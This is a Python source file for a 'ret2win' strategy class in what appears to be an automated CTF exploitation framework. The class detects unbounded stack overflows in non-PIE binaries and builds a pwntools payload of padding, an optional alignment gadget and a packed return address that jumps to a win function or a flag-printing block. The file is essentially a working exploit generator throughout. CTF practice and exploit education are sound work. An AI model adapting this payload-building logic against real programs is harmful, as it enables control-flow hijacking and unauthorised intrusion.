"""ret2win strategy: overflow the saved RET and jump to code that gives the flag.

Target priority: an explicit --target, then a win-named function symbol, then
the auto-detected flag-printing block. Needs a non-PIE binary (or a known base)
because the target is a fixed code address.
"""
from pwn import p64

from .base import Strategy
from .. import report


class Ret2Win(Strategy):
    name = "ret2win"
    desc = "overflow RET and jump to a win function / flag block"

    def _target(self, ctx):
        if getattr(ctx.args, "target", None):
            return int(ctx.args.target, 16), "cli --target"
        a = ctx.analysis
        if a.win_funcs:
            name, addr = a.win_funcs[0]
            return addr, f"win symbol '{name}'"
        if a.flag_block:
            return a.flag_block, "auto-detected flag block"
        return None, "no target"

    def detect(self, ctx):
        a = ctx.analysis
        if not a.primary_input or not a.primary_input.unbounded:
            return 0, "no unbounded overflow"
        tgt, why = self._target(ctx)
        if tgt is None and not a.getenv_flag:
            return 0, "no win function / flag block found"
        if ctx.binary.pie and not getattr(ctx.args, "target", None):
            return 10, "PIE: ret2win needs a runtime leak (no static target)"
        if tgt is not None:
            return 70, f"target via {why}"
        return 30, "flag is printed somewhere but no clear jump target"

    def build(self, ctx):
        tgt, why = self._target(ctx)
        if tgt is None:
            return None, False, "no target to jump to"
        if ctx.binary.pie and not getattr(ctx.args, "target", None):
            return None, False, "PIE without a leak: cannot use a static target"

        offset = ctx.ret_offset()
        if offset is None:
            return None, False, "offset unknown"

        pad = (getattr(ctx.args, "pad", "A") or "A").encode()[:1]
        payload = pad * offset
        note = f"{offset} pad + p64({hex(tgt)})  [{why}]"

        if getattr(ctx.args, "align", False):
            ret = ctx.binary.ret_gadget()
            if ret:
                payload += p64(ret)
                note += " +align"
        payload += p64(tgt)
        return payload, False, note
